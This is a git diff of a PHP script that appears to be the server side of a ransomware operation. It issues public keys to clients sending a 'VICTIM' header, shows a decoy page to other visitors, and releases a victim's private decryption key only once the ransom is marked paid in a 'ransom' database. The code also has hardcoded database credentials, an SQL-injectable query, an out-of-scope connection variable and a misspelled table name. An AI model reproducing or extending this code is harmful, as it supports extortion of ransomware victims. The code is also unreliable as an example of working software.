@@ -1,14 +1,11 @@
 <?php
 
-function Connect(){
-	//Configuration of database
-	$dbconn = pg_connect("host=localhost port=5432 dbname=ransom user=postgres password=admin");
-	if(!$dbconn)
-	{
-		echo "An error Ocurred!\n";
-		exit;
-	}
-	return $dbconn;
+//Configuration of database
+$dbconn = pg_connect("host=localhost port=5432 dbname=ransom user=postgres password=admin");
+if(!$dbconn)
+{
+	echo "An error Ocurred!\n";
+	exit;
 }
 
 function keyPairGeneration(){
@@ -41,7 +38,7 @@ function getRequestHeaders(){
 function checkValidity(){
 	$headers = getRequestHeaders();
 	foreach($headers as $header => $value){
-		if($header == "HTTP_VICTIM" && $value=="yes"){
+		if($header == "HTTP_VICTIM" && $value=="Yes"){
 			return 1;
 			//echo keyPairGeneration()->pubKey;	
 		}
@@ -63,8 +60,33 @@ function hide(){
 	</html>";
 }
 
+function returnPrivate($id){
+	$query = "SELECT payment_status FROM ransomware_details where identifier='$id'";
+	$result = pg_query($dbconn,$query);
+	echo "$result@";
+	if ($result == 'No')
+		echo "Not paid ransom";
+	else if ($result == "Yes"){
+		$query = "SELECT private_key from ransomware_detials where identifier='$id'";
+		$result = pg_query($dbconn,$query);
+		echo $result;
+	}
+	else{
+		//Database error
+		exit;
+	}
+}
+
+function check1(){
+	if( isset($_GET['decrypt'])){
+		$id = $_GET['decrypt'];
+		returnPrivate($id);
+	}
+}
+
+
 if(checkValidity()){
-	$dbconn = Connect();
+	check1();
 	$result = pg_query($dbconn, "SELECT identifier FROM ransomware_details ORDER BY identifier DESC LIMiT 1;");
 	//echo "Working!";
 	if(!$result){
@@ -84,6 +106,9 @@ if(checkValidity()){
 		abort();
 		exit;
 	}
+	//Finally send the public key after all checks
+	echo "$id@\n";
+	echo $pub;
 }
 else{
 	hide();
